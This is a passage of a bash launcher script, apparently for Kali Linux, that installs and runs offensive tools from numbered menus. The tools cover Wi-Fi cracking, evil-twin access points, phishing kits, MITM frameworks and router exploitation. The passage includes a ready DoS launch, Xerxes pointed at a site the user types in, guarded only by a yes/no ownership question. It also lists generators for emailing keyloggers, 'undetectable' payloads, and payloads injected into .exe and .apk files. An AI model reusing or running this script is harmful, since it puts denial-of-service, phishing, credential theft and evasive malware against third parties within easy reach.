\"/usr/share/fern-wifi-cracker\" ]]\n\tthen\t\n\t\techo -e \"\"$YS\"10\"$CE\") Fern                  Wifi cracker GUI\"\n\telse\n\t\techo -e \"\"$RS\"10\"$CE\") \"$RS\"Fern\"$CE\"                  Wifi cracker GUI\"\n\tfi\n\tif [[ -f /usr/sbin/netdiscover ]]\n\tthen\t\n\t\techo -e \"\"$YS\"11\"$CE\") Netdiscover           Network address discovering tool\"\n\telse\n\t\techo -e \"\"$RS\"11\"$CE\") \"$RS\"Netdiscover\"$CE\"           Network address discovering tool\"\n\tfi\n\tif [[ -d /root/kickthemout ]]\n\tthen\t\n\t\techo -e \"\"$YS\"12\"$CE\") KickThemOut           Kick devices off your network\"\n\telse\n\t\techo -e \"\"$RS\"12\"$CE\") \"$RS\"KickThemOut\"$CE\"           Kick devices off your network\"\n\tfi\n\tif [[ -d \"/usr/share/ghost-phisher\" ]]\n\tthen\t\n\t\techo -e \"\"$YS\"13\"$CE\") Ghost-Phisher         Fake AP,MITM,Session hijacking etc...\"\n\telse\n\t\techo -e \"\"$RS\"13\"$CE\") \"$RS\"Ghost-Phisher\"$CE\"         Fake AP,MITM,Session hijacking etc...\"\n\tfi\n\tif [[ -d /root/The-Eye ]]\n\tthen\t\n\t\techo -e \"\"$YS\"14\"$CE\") The Eye               Detects ARP poisoning DNS spoofing etc...\"\n\telse\n\t\techo -e \"\"$RS\"14\"$CE\") \"$RS\"The Eye\"$CE\"               Detects ARP poisoning DNS spoofing etc...\"\n\tfi\n\tif [[ -d /root/xerxes ]]\n\tthen\t\n\t\techo -e \"\"$YS\"15\"$CE\") Xerxes                The most powerful DoS tool(CAUTION)\"\n\telse\n\t\techo -e \"\"$RS\"15\"$CE\") \"$RS\"Xerxes\"$CE\"                The most powerful DoS tool(CAUTION)\"\n\tfi\n\tif [[ -d /root/KatanaFramework ]]\n\tthen\n\t\techo -e \"\"$YS\"16\"$CE\") Katana Framework      Many penetration testing features\"\n\telse\n\t\techo -e \"\"$RS\"16\"$CE\") \"$RS\"Katana Framework\"$CE\"      Many penetration testing features\"\n\tfi\n\tif [[ -d /root/airgeddon ]]\n\tthen\n\t\techo -e \"\"$YS\"17\"$CE\") Airgeddon             Audit wireless networks.\"\n\telse\n\t\techo -e \"\"$RS\"17\"$CE\") \"$RS\"Airgeddon\"$CE\"             Audit wireless networks.\"\n\tfi\n\tif [[ -f /usr/bin/websploit ]]\n\tthen\n\t\techo -e \"\"$YS\"18\"$CE\") Websploit             Advanced MITM framework\"\n\telse\n\t\techo -e \"\"$RS\"18\"$CE\") \"$RS\"Websploit\"$CE\"             Advanced MITM framework\"\n\tfi\n\tif [[ -d /etc/openvas ]]\n\tthen\n\t\techo -e \"\"$YS\"19\"$CE\") Openvas               Vulnerability scanner LAN\"\n\telse\n\t\techo -e \"\"$RS\"19\"$CE\") \"$RS\"Openvas\"$CE\"               Vulnerability scanner LAN\"\n\tfi\n\tif [[ -f /usr/bin/ipscan ]]\n\tthen\n\t\techo -e \"\"$YS\"20\"$CE\") Angry IP Scanner      IP Scanner\"\n\telse\n\t\techo -e \"\"$RS\"20\"$CE\") \"$RS\"Angry IP Scanner\"$CE\"      IP Scanner\"\n\tfi\n\tif [[ -d /root/routersploit ]]\n\tthen\n\t\techo -e \"\"$YS\"21\"$CE\") Routersploit          Find/exploit router vulnerabilities\"\n\telse\n\t\techo -e \"\"$RS\"21\"$CE\") \"$RS\"Routersploit\"$CE\"          Find/exploit router vulnerabilities\"\n\tfi\n\tif [[ -d /root/nWatch ]]\n\tthen\n\t\techo -e \"\"$YS\"22\"$CE\") nWatch                IP scanner/OS detection\"\n\telse\n\t\techo -e \"\"$RS\"22\"$CE\") \"$RS\"nWatch\"$CE\"                IP scanner/OS detection\"\n\tfi\n\tif [[ -d /root/eternal_scanner ]]\n\tthen\n\t\techo -e \"\"$YS\"23\"$CE\") Eternal scanner       Scans hosts for eternalblue vulnerabilities\"\n\telse\n\t\techo -e \"\"$RS\"23\"$CE\") \"$RS\"Eternal scanner\"$CE\"       Scans hosts for eternalblue vulnerabilities\"\n\tfi\n\tif [[ -d /root/eaphammer ]]\n\tthen\n\t\techo -e \"\"$YS\"24\"$CE\") Eaphammer             Evil twin attacks against WPA2-Enterprise networks\"\n\telse\n\t\techo -e \"\"$RS\"24\"$CE\") \"$RS\"Eaphammer\"$CE\"             Evil twin attacks against WPA2-Enterprise networks\"\n\tfi\n\tif [[ -d /root/VMR ]]\n\tthen\n\t\techo -e \"\"$YS\"25\"$CE\") VMR                   Best WPS cracker, mdk3-v6\"\n\telse\n\t\techo -e \"\"$RS\"25\"$CE\") \"$RS\"VMR\"$CE\"                   Best WPS cracker, mdk3-v6\"\n\tfi\n\tif [[ -d /root/netattack2 ]]\n\tthen\n\t\techo -e \"\"$YS\"26\"$CE\") Netattack3            Advanced network scan and attack script\"\n\telse\n\t\techo -e \"\"$RS\"26\"$CE\") \"$RS\"Netattack2\"$CE\"            Advanced network scan and attack script\"\n\tfi\n\tif [[ -f /usr/bin/wifi-pumpkin ]]\n\tthen\n\t\techo -e \"\"$YS\"27\"$CE\") Wifi-Pumpkin          Framework for Rogue Wi-Fi Access Point Attack\"\n\telse\n\t\techo -e \"\"$RS\"27\"$CE\") \"$RS\"Wifi-Pumpkin\"$CE\"          Framework for Rogue Wi-Fi Access Point Attack\"\n\tfi\n\tif [[ -d /root/Gloom-Framework ]]\n\tthen\n\t\techo -e \"\"$YS\"28\"$CE\") Gloom                 Penetration Testing Framework\"\n\telse\n\t\techo -e \"\"$RS\"28\"$CE\") \"$RS\"Gloom\"$CE\"                 Penetration Testing Framework\"\n\tfi\n\tif [[ -f /usr/bin/sechub ]]\n\tthen\n\t\techo -e \"\"$YS\"29\"$CE\") secHub                Security/Hacking Kit\"\n\telse\n\t\techo -e \"\"$RS\"29\"$CE\") \"$RS\"secHub\"$CE\"                Security/Hacking Kit\"\n\tfi\n\tif [[ -d /root/SocialFish ]]\n\tthen\n\t\techo -e \"\"$YS\"30\"$CE\") SocialFish            Ultimate phishing tool with Ngrok integrated\"\n\telse\n\t\techo -e \"\"$RS\"30\"$CE\") \"$RS\"SocialFish\"$CE\"            Ultimate phishing tool with Ngrok integrated\"\n\tfi\n\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\techo -e \"\"$YS\"00\"$CE\") Main menu\"\n\t#echo -e \"\"$YS\" 0\"$CE\") EXIT\"\n\techo -e \"Choose: \"\n\tread -e APPP\n\tclear\n\tif [[ \"$APPP\" = \"1\" ]]\n\tthen\n\t\tif [[ -d /root/fluxion ]]\n\t\tthen\n\t\t\tcd /root/fluxion\n\t\t\t#~ if [[ -f /root/fluxion/fluxion ]]\n\t\t\t#~ then\n\t\t\t\t./fluxion*\n\t\t\t#~ elif [[ -f /root/fluxion/fluxion.sh ]]\n\t\t\t#~ then\n\t\t\t\t#~ ./fluxion.sh\n\t\t\t#~ fi\n\t\t\tcd\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_fluxion\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"2\" ]]\n\tthen\n\t\tif [[ $(which wifite) ]]\n\t\tthen\n\t\t\twifite\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_wifite\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"3\" ]]\n\tthen\n\t\tif [[ -d /root/wifiphisher ]]\n\t\tthen\n\t\t\tclear\n\t\t\twifiphisher\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_wifiphisher\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"4\" ]]\n\tthen\n\t\tif [[ -d /root/Zatacker ]]\n\t\tthen\n\t\t\tif [[ -d \"/root/Zatacker\" ]]\n\t\t\tthen\t\n\t\t\t\tcd /root/Zatacker\n\t\t\t\t./ZT.sh\n\t\t\t\tcd\n\t\t\telse\n\t\t\t\techo -e \"You have to install it manually since its not on github.Sorry.\"\n\t\t\t\tsleep 4\n\t\t\t\texec bash \"$0\"\n\t\t\tfi\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_zatacker\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"5\" ]]\n\tthen\n\t\tif [[ -d /root/morpheus ]]\n\t\tthen\n\t\t\tcd /root/morpheus\n\t\t\t./morpheus.sh\n\t\t\tcd\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_morpheus\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"6\" ]]\n\tthen\n\t\tif [[ -d \"/root/opensource\" ]]\n\t\tthen\n\t\t\tcd /root/opensource\n\t\t\t./netool.sh\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_netool\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"7\" ]]\n\tthen\n\t\tif [[ -d /root/hakkuframework ]]\n\t\tthen\n\t\t\techo -e \"type: 'show modules' to start\"\n\t\t\tsleep 2\n\t\t\tclear\n\t\t\tcd /root/hakkuframework\n\t\t\t./hakku\n\t\t\tcd\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_hakku\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"8\" ]]\n\tthen\n\t\tif [[ -d /root/Trity ]]\n\t\tthen\n\t\t\techo -e \"type: 'help' to start\"\n\t\t\tsleep 2\n\t\t\tclear\n\t\t\ttrity\t\t\t\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_trity\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"9\" ]]\n\tthen\n\t\tif [[ -d \"/root/Dracnmap\" ]]\n\t\tthen\n\t\t\tcd /root/Dracnmap/\n\t\t\t./dracnmap-v*.sh\t\n\t\t\tcd\t\t\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_dracnmap\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"10\" ]]\n\tthen\n\t\tif [[ -d \"/usr/share/fern-wifi-cracker\" ]]\n\t\tthen\n\t\t\tcd /root/Fern-Wifi-Cracker\n\t\t\tpython execute.py\n\t\t\tcd\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_fern\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"11\" ]]\n\tthen\n\t\tif [[ -f /usr/sbin/netdiscover ]]\n\t\tthen\n\t\t\techo -e \"Range (\"$YS\"Enter\"$CE\"=192.168.1.0/24):\"\n\t\t\tread NRANGE\n\t\t\tif [[ -z $NRANGE ]]\n\t\t\tthen\n\t\t\t\tNRANGE=\"192.168.1.0/24\"\n\t\t\tfi\n\t\t\tnetdiscover -r $NRANGE -i \"$WLANN\"\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_netdiscover\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"12\" ]]\n\tthen\n\t\tif [[ -d \"/root/kickthemout\" ]]\n\t\tthen\n\t\t\tcd /root/kickthemout\n\t\t\tpython kickthemout.py\n\t\t\tcd\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_kickthemout\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"13\" ]]\n\tthen\n\t\tif [[ -d \"/usr/share/ghost-phisher\" ]]\n\t\tthen\t\n\t\t\tcd /root/ghost-phisher/Ghost-Phisher\n\t\t\tpython ghost.py\n\t\t\tcd\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_ghostphisher\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"14\" ]]\n\tthen\n\t\tif [[ -d \"/root/The-Eye\" ]]\n\t\tthen\n\t\t\tcd /root/The-Eye\n\t\t\t./TheEye\n\t\t\tcd\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_theeye\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"15\" ]]\n\tthen\n\t\tif [[ -d \"/root/xerxes\" ]]\n\t\tthen\n\t\t\techo -e \"Do you own the site you want to DoS?\"$YNONLY\"\"\n\t\t\tread DOSTERM\n\t\t\tif [[ \"$DOSTERM\" = \"y\" ]]\n\t\t\tthen\n\n\t\t\t\tclear\n\t\t\t\techo -e \"Enter your site(e.g: iownthissite.com): \"\n\t\t\t\techo -e \"(without www)\"\n\t\t\t\tread -e SITEDOS\n\t\t\t\tclear\n\t\t\t\techo -e \"Launching www.isitdownrightnow.com for $SITEDOS\"\n\t\t\t\tsleep 4\n\t\t\t\tgio open http://www.isitdownrightnow.com/\"$SITEDOS\".html\n\t\t\t\tclear\t\n\t\t\t\tcd /root/xerxes\n\t\t\t\tSITEDOSX=www.$SITEDOS\n\t\t\t\techo -e \"Press \"$YS\"any key\"$CE\" to start DoS on $SITEDOSX\"\n\t\t\t\t$READAK\n\t\t\t\t./xerxes $SITEDOSX 80\n\t\t\telse\n\t\t\t\tclear\n\t\t\t\techo -e \"Then never try this.\"\n\t\t\t\tsleep 3\n\t\t\t\texec bash \"$0\"\n\t\t\tfi\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_xerxes\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"16\" ]]\n\tthen\n\t\tif [[ -d \"/usr/share/KatanaFramework\" ]]\n\t\tthen\n\t\t\tktf.console\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_katana\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"17\" ]]\n\tthen\n\t\tif [[ -d \"/root/airgeddon\" ]]\n\t\tthen\n\t\t\tcd /root/airgeddon\n\t\t\t./airgeddon.sh\n\t\t\tcd\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_airgeddon\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"18\" ]]\n\tthen\n\t\tif [[ -d \"/usr/share/websploit\" ]]\n\t\tthen\n\t\t\twebsploit\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_websploit\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"19\" ]]\n\tthen\n\t\tif [[ -d /etc/openvas ]]\n\t\tthen\n\t\t\techo -e \"Start or stop?(\"$YS\"start\"$CE\"/\"$YS\"stop\"$CE\")\"\n\t\t\tread -e SORS\n\t\t\tif [[ \"$SORS\" == \"start\" ]]\n\t\t\tthen\n\t\t\t\tnetstat -nltp\n\t\t\t\topenvas-start\n\t\t\t\techo -e \"Launching firefox...\"\n\t\t\t\tsleep 1\n\t\t\t\tfirefox https://127.0.0.1:9392\n\t\t\telse\n\t\t\t\topenvas-stop\n\t\t\tfi\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_openvas\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"20\" ]]\n\tthen\n\t\tif [[ -d \"/usr/lib/ipscan\" ]]\n\t\tthen\n\t\t\tbash /usr/bin/ipscan & disown\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_angryip\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"21\" ]]\n\tthen\n\t\tif [[ -d \"/root/routersploit\" ]]\n\t\tthen\n\t\t\tcd /root/routersploit\n\t\t\t./rsf.py\n\t\t\tcd\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_routersploit\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"22\" ]]\n\tthen\n\t\tif [[ -d \"/root/nWatch\" ]]\n\t\tthen\n\t\t\tcd /root/nWatch\n\t\t\tpython nwatch.py\n\t\t\tcd\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_nwatch\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"23\" ]]\n\tthen\n\t\tif [[ -d \"/root/eternal_scanner\" ]]\n\t\tthen\n\t\t\tcd /root/eternal_scanner\n\t\t\t./escan\n\t\t\tcd\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_eternalscanner\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"24\" ]]\n\tthen\n\t\tif [[ -d \"/root/eaphammer\" ]]\n\t\tthen\n\t\t\teaphammer_automation\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_eaphammer\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\t\tcd\n\telif [[ \"$APPP\" = \"25\" ]]\n\tthen\n\t\tif [[ -d \"/root/VMR\" ]]\n\t\tthen\n\t\t\tcd /root/VMR\n\t\t\t./VMR-MDK-K2-2017R-012x2.sh\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_vmr\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\t\tcd\n\telif [[ \"$APPP\" = \"26\" ]]\n\tthen\n\t\tif [[ -d \"/root/netattack2\" ]]\n\t\tthen\n\t\t\tcd /root/netattack2\n\t\t\tpython2 netattack2.py\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_netattack2\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\t\tcd\n\telif [[ \"$APPP\" = \"27\" ]]\n\tthen\n\t\tif [[ -f \"/usr/bin/wifi-pumpkin\" ]]\n\t\tthen\n\t\t\twifi-pumpkin\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_wifi_pumpkin\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\t\tcd\n\telif [[ \"$APPP\" = \"28\" ]]\n\tthen\n\t\tif [[ -d \"/root/Gloom-Framework\" ]]\n\t\tthen\n\t\t\tcd /root/Gloom-Framework\n\t\t\tpython gloom.py\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_gloom\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\t\tcd\n\telif [[ \"$APPP\" = \"29\" ]]\n\tthen\n\t\tif [[ -f \"/usr/bin/sechub\" ]]\n\t\tthen\n\t\t\tsechub\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_sechub\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\t\tcd\n\telif [[ \"$APPP\" = \"30\" ]]\n\tthen\n\t\tif [[ -d \"/root/SocialFish\" ]]\n\t\tthen\n\t\t\tcd /root/SocialFish\n\t\t\tpython SocialFish.py\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_socialfish\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\t\tcd\n\telif [[ \"$APPP\" = \"7\" ]]\n\tthen\n\t\tif [[ -d \"/root/hakkuframework\" ]]\n\t\tthen\n\t\t\twhile true\n\t\t\tdo\n\t\t\tprintf '\\033]2;OSRFCONSOLE\\a'\n\t\t\tclear\n\t\t\techo -e \"\"$YS\" 1\"$CE\") usufy\"\n\t\t\techo -e \"\"$YS\" 2\"$CE\") mailfy\"\n\t\t\techo -e \"\"$YS\" 3\"$CE\") searchfy\"\n\t\t\techo -e \"\"$YS\" 4\"$CE\") domainfy\"\n\t\t\techo -e \"\"$YS\" 5\"$CE\") phonefy\"\n\t\t\techo -e \"\"$YS\" 6\"$CE\") entify\"\n\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\techo -e \"\"$YS\"00\"$CE\") Main menu\"\n\t\t#\techo -e \"\"$YS\" 0\"$CE\") EXIT\"\n\t\t\techo -e \"Choose: \"\n\t\t\tread -e OSFR\n\t\t\tclear\n\t\t\t\tif [[ \"$OSFR\" = \"1\" ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"Use: usufy.py -n name1 name2 -p twitter facebook\"\n\t\t\t\t\tusufy.py\n\t\t\t\t\texit\n\t\t\t\telif [[ \"$OSFR\" = \"2\" ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"Use: mailfy.py -n name1\"\n\t\t\t\t\tmailfy.py\n\t\t\t\t\texit\n\t\t\t\telif [[ \"$OSFR\" = \"3\" ]]\n\t\t\t\tthen\n\t\t\t\t\tsearchfy.py\n\t\t\t\t\texit\n\t\t\t\telif [[ \"$OSFR\" = \"4\" ]]\n\t\t\t\tthen\n\t\t\t\t\tdomainfy.py\n\t\t\t\t\texit\n\t\t\t\telif [[ \"$OSFR\" = \"5\" ]]\n\t\t\t\tthen\n\t\t\t\t\tphonefy.py\n\t\t\t\t\texit\n\t\t\t\telif [[ \"$OSFR\" = \"6\" ]]\n\t\t\t\tthen\n\t\t\t\tentify.py\n\t\t\t\t\texit\n\t\t\t\telif [[ \"$OSFR\" = \"0\" ]]\n\t\t\t\tthen\n\t\t\t\t\texit\n\t\t\t\telif [[ \"$OSFR\" = \"00\" ]]\n\t\t\t\tthen\n\t\t\t\t\texec bash \"$0\"\n\t\t\t\telif [[ \"$OSFR\" = \"back\" || \"$OSFR\" = \"b\" ]]\n\t\t\t\tthen\n\t\t\t\t\tbreak\n\t\t\t\telse \n\t\t\t\t\techo -e \"Wrong choice\"\n\t\t\t\t\tsleep 0.3\n\t\t\t\t\tclear\n\t\t\t\t\texec bash \"$0\"\n\t\t\t\tfi\n\t\t\tdone\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_osrframework\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$APPP\" = \"0\" ]]\n\tthen\n\t\tclear\n\t\texit\n\telif [[ \"$APPP\" = \"00\" ]]\n\tthen\n\t\tclear\n\t\texec bash \"$0\"\n\telif [[ \"$APPP\" = \"back\" || \"$APPP\" = \"b\" ]]\n\tthen\n\t\tbreak\n\tfi\n\tif [[ \"$APPP\" != \"\" ]]\n\tthen\n\t\techo -e \"$PAKTGB\"\n\t\t$READAK\n\tfi\n\tdone\n}\nfunction remote_access\n{\n\twhile true \n\tdo\n\tclear\n\tTERMINALTITLE=\"REMOTE ACCESS\"\n\tdash_calc\n\tprintf '\\033]2;REMOTE ACCESS\\a'\n\tif [[ -d /root/BeeLogger ]]\n\tthen\n\t\techo -e \"\"$YS\" 1\"$CE\") BeeLogger             Generate Gmail Emailing Keyloggers to Windows\"\n\telse\n\t\techo -e \"\"$RS\" 1\"$CE\") \"$RS\"BeeLogger\"$CE\"             Generate Gmail Emailing Keyloggers to Windows\"\n\tfi\n\tif [[ -d /root/ezsploit ]]\n\tthen\n\t\techo -e \"\"$YS\" 2\"$CE\") Ezsploit              Automation for metasploit\"\n\telse\n\t\techo -e \"\"$RS\" 2\"$CE\") \"$RS\"Ezsploit\"$CE\"              Automation for metasploit\"\n\tfi\n\tif [[ -d /root/pupy ]]\n\tthen\n\t\techo -e \"\"$YS\" 3\"$CE\") Pupy                  Remote administration and post-exploitation tool\"\n\telse\n\t\techo -e \"\"$RS\" 3\"$CE\") \"$RS\"Pupy\"$CE\"                  Remote administration and post-exploitation tool\"\n\tfi\n\tif [[ -d /root/zirikatu ]]\n\tthen\n\t\techo -e \"\"$YS\" 4\"$CE\") Zirikatu              Fud Payload generator script\"\n\telse\n\t\techo -e \"\"$RS\" 4\"$CE\") \"$RS\"Zirikatu\"$CE\"              Fud Payload generator script\"\n\tfi\n\tif [[ -d /root/TheFatRat ]]\n\tthen\n\t\techo -e \"\"$YS\" 5\"$CE\") TheFatRat             Generate undetectable payloads\"\n\telse\n\t\techo -e \"\"$RS\" 5\"$CE\") \"$RS\"TheFatRat\"$CE\"             Generate undetectable payloads\"\n\tfi\n\tif [[ -d /root/Winpayloads ]]\n\tthen\n\t\techo -e \"\"$YS\" 6\"$CE\") Winpayloads           Generate undetectable payloads\"\n\telse\n\t\techo -e \"\"$RS\" 6\"$CE\") \"$RS\"Winpayloads\"$CE\"           Generate undetectable payloads\"\n\tfi\n\tif [[ -f /usr/bin/shellter ]]\n\tthen\n\t\techo -e \"\"$YS\" 7\"$CE\") Shellter              Inject payload into .exe\"\n\telse\n\t\techo -e \"\"$RS\" 7\"$CE\") \"$RS\"Shellter\"$CE\"              Inject payload into .exe\"\n\tfi\n\tif [[ -d /root/CHAOS ]]\n\tthen\n\t\techo -e \"\"$YS\" 8\"$CE\") CHAOS                 Generate payloads/listeners\"\n\telse\n\t\techo -e \"\"$RS\" 8\"$CE\") \"$RS\"CHAOS\"$CE\"                 Generate payloads/listeners\"\n\tfi\n\tif [[ -d /root/kwetza ]]\n\tthen\n\t\techo -e \"\"$YS\" 9\"$CE\") Kwetza                Inject payload to apk\"\n\telse\n\t\techo -e \"\"$RS\" 9\"$CE\") \"$RS\"Kwetza\"$CE\"                Inject payload to apk\"\n\tfi\n\tif [[ -d /root/koadic ]]\n\tthen\n\t\techo -e \"\"$YS\"10\"$CE\") Koadic                Windows post-exploitation rootkit\"\n\telse\n\t\techo -e \"\"$RS\"10\"$CE\") \"$RS\"Koadic\"$CE\"                Windows post-exploitation rootkit\"\n\tfi\n\tif [[ -d /root/Empire ]]\n\tthen\n\t\techo -e \"\"$YS\"11\"$CE\") Empire                PowerShell and Python 